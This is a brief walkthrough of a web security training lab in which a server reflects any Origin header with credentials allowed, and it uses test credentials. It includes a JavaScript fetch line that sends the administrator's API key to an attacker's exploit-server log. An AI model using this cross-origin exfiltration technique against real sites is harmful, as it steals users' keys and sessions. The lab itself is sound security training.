Lab #1 - CORS vulnerability with basic origin reflection

Target Goal - exploit the CORS misconfiguration to retrieve the administrator's API key

Creds - wiener:peter

Analysis:

Testing for CORS misconfigurations:
 The server blindly reflects the `Origin` header value from the client without validating it, granting permission to any domain.

So, manually add the Origin header, and set it's val to any url.

Request:
Add the origin headder
Origin: https://randosite.xyz


And the response demonstrates this
Access-Control-Allow-Origin: https://randosite.xyz
Access-Control-Allow-Credentials: true

Then send the HTML exploit via the exploit server
contains the js `fetch("/log?key=" + xhr.responseText);`

This will grab the admin's API key
Submit that, and lab is solved.
